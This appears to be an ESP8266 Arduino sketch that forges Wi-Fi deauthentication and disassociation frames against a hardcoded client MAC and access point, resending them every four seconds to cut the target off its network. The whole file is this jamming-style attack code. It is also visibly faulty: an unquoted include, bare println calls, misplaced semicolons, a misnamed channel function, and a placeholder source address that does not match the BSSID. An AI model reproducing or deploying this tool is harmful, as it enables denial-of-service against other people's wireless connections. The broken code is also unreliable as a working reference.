#include <ESP8266WiFi.h>

extern "C" {
#include user_interface.h
 }
 
 //definging packets
 
 uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xC0, 0xAD, 0x97, 0xCD, 0x44, 0x1B, // receiver (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
    /* 16 - 21 */ 0xCC, 0x20, 0x8C, 0x04, 0x74, 0xFE, // BSSID (AP)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};
uint8_t disassPacket[26] = {
    /*  0 - 1  */ 0xA0, 0x00,                         // type, subtype a0: disassociation
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xC0, 0xAD, 0x97, 0xCD, 0x44, 0x1B, // receiver (target)
    /* 10 - 15 */ 0xCC, 0x20, 0x8C, 0x04, 0x74, 0xFE, // source (AP)
    /* 16 - 21 */ 0xCC, 0x20, 0x8C, 0x04, 0x74, 0xFE, // BSSID (AP)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

//functions
void sendPackets(){
    wifi_set_opmode(WIFI_STA);
    wifi_promiscuous_enable(0);
    wifi_channel(1);
    
    
    //sending the pkts
    int deauthSize = sizeof(deauthPacket);
    if (wifi_sendpkt_freedom(deauthPacket, deauthSize, 0) != 0){
    	println("fail! fail! F, NO deauth PKTS SENT")};
    
    int disassSize = sizeof(disassPacket);
    if (wifi_sendpkt_freedom(disassPacket,disassSize, 0) != 0){
    	println("fail! fail! F, NO disass PKTS SENT")};
    
     // serial output
    Serial.print("Deauth & Disass pkts have been sent. Size in order: ");
    Serial.print(deauthSize); 
    Serial.print(" bytes."); 
    
    Serial.print(disassSize);
    Serial.print(" bytes."); 
    
    Serial.println ("Timestamps: ");
    Serial.println(millis()); // Print the timestamp when the packet is sent
    
}

void setup(){
    Serial.begin(115200);
    Serial.print("Sending packets");
    
    sendPackets();
    
}
void loop(){
    delay(4000);
    sendPackets();

}

